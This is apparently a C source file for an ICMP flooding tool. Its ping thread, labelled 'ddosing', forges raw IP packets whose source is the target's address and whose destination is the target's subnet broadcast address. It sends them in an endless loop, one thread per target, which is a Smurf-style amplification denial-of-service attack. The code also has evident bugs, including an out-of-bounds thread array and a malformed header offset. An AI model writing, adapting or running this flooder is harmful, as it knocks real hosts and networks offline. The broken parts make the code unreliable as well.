#include "client_lib.h"

struct protoent *proto = NULL;
pthread_mutex_t lock;

unsigned short checksum(void *b, int len)
{
    unsigned short *buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for(sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

void tv_sub(struct timeval *out, const struct timeval *in)
{
    if ((out->tv_usec -= in->tv_usec) < 0)
    {
        out->tv_usec += 1000000;
    }
    out->tv_sec -= in->tv_sec;
    return;
}

int display(void* buf)
{
    struct iphdr *ip = (struct iphdr*)buf;
    struct icmphdr *icmp = (struct icmphdr*)((int*)buf + ip->ihl);
    if (icmp->type == 0 || icmp->type == 11){
        /*for (int i = 0; i < bytes; i++)*/
        /*{*/
            /*if (!(i & 15))*/
                /*printf("\nX:%2d", i);*/
            /*printf("%4x", ((unsigned char*)buf)[i]);*/
        /*}*/
        struct in_addr ntoa_addr;
        ntoa_addr.s_addr = ip->saddr;
        printf("IPv%d: hdr-size=%d pkt-size=%d protocol=%d  TTL=%d src=%s ",
                ip->version, ip->ihl * 4, htons(ip->tot_len), ip->protocol,
                ip->ttl, inet_ntoa(ntoa_addr));

        ntoa_addr.s_addr = ip->daddr;
        printf("dst=%s\n", inet_ntoa(ntoa_addr));
        /*printf("thread_id: %u thread:%u\n", icmp->un.echo.id, thread_id);*/
        /*if (icmp->un.echo.id == thread_id)*/
        {
            printf("ICMP: type[%d/%d] checksum[%d] id[%d] seq[%d] ",
                    icmp->type, icmp->code, ntohs(icmp->checksum),
                    icmp->un.echo.id, icmp->un.echo.sequence);
            struct timeval start ;
            start = *((struct timeval*)((char*)icmp + sizeof(struct icmphdr)));
            pthread_mutex_unlock(&lock);
            if (icmp->type == 0)
                return 0;
            else
                return 1;
        }
    }
    return 1;
}

void listener()
{
    int sd;
    struct sockaddr_in addr;
    unsigned char buf[1024];

    sd = socket(PF_INET, SOCK_RAW, proto->p_proto);
    if (sd < 0) {
        perror("socket");
        exit(0);
    }
    if ( fcntl(sd, F_SETFL, O_NONBLOCK) != 0)
        perror("Request Nonblocking I/O");

    struct timeval start;
    struct timeval finish;
    gettimeofday(&start, NULL);
    for(;;) {
        /*puts("listener");*/
        int bytes, len = sizeof(addr);

        memset(buf, 0, sizeof(buf));
        bytes = recvfrom(sd, buf, sizeof(buf), 0, (struct sockaddr*)&addr, (socklen_t*)&len);
        gettimeofday(&finish, NULL);
        tv_sub(&finish, &start);
        if (finish.tv_sec > 1)
            return;
        if (bytes > 0) {
            int res = display(buf);
            if (!res) {
                sleep(1);
                exit(0);
            }
            else
                break;
        }
    }
}

void* ping(void* arg)
{
    puts("ddosing");
    struct thread_info *tinfo = (struct thread_info*)arg;
    struct sockaddr_in* addr = &(tinfo->addr);
    int sd;
    struct packet pckt;

    char netmask[] = "255.255.255.0";
    struct in_addr mask, broadcast;
    struct sockaddr_in broadcast_addr;
    if (inet_pton(AF_INET, netmask, &mask) == 1)
        broadcast.s_addr = addr->sin_addr.s_addr | ~mask.s_addr;
    else {
        fprintf(stderr, "Failed converting strings to numbers\n");
        return NULL;
    }

    broadcast_addr.sin_family = addr->sin_family;
    broadcast_addr.sin_port = addr->sin_port;
    broadcast_addr.sin_addr.s_addr = broadcast.s_addr;

    sd = socket(PF_INET, SOCK_RAW, proto->p_proto);
    if (sd < 0) {
    perror("socket");
    return NULL;
    }
    if ( fcntl(sd, F_SETFL, O_NONBLOCK) != 0)
    perror("Request Nonblocking I/O");

    int bcast = 1;

    if (setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *) &bcast, sizeof(bcast)))
        perror("Set Broadcast option");

    int val = 255;
    if (setsockopt(sd, SOL_IP, IP_TTL, &val, sizeof(val)) != 0)
        perror("Set TTL option");

    int hincl = 1;
    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    struct iphdr *ip = (struct iphdr*)&pckt;
    struct icmphdr *icmp = (struct icmphdr*)((int*)&pckt + sizeof(struct iphdr));

    ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + MSG_SIZE;
    ip->ihl = sizeof *ip >> 2;
    ip->version = 4;
    ip->ttl = 255;
    ip->tos = 0;
    ip->frag_off = 0;
    ip->id = htons(getpid());
    ip->protocol = 1;
    ip->saddr = addr->sin_addr.s_addr;
    ip->daddr = broadcast.s_addr;
    /*ip->sum = 0;*/

    icmp->type = 8;
    icmp->code = 0;
    /*icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));*/
    icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + MSG_SIZE);

    for (;;) {
        printf("\n");
        printf("%s\n", msg);
        if (sendto(sd, &pckt, sizeof(pckt), 0, (struct sockaddr*)&broadcast_addr, sizeof(broadcast_addr)) <= 0)
            perror("sendto");
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    struct hostent *hname;
    struct sockaddr_in addr;
    struct thread_info* tinfo;

    if (argc < 2) {
        printf("usage: %s <addr>\n", argv[0]);
        exit(0);
    }

    tinfo = (struct thread_info*)calloc(argc - 1, sizeof(struct thread_info));
    assert(!pthread_mutex_init(&lock, NULL));

    proto = getprotobyname("ICMP");
    for (int i = 1; i < argc; i++) {
        hname = gethostbyname(argv[i]);
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = hname->h_addrtype;
        addr.sin_port = 0;
        addr.sin_addr.s_addr = *(long*)hname->h_addr_list[0];

        tinfo[i].addr = addr;
        pthread_create(&tinfo[i].thread_id, NULL, &ping, &tinfo[i]);

        /*if ((pid = fork()) == 0)*/
        /*ping(&addr);*/
        /*else*/
        /*listener();*/
    }
    while(1);
    pthread_mutex_destroy(&lock);
    return 0;
}
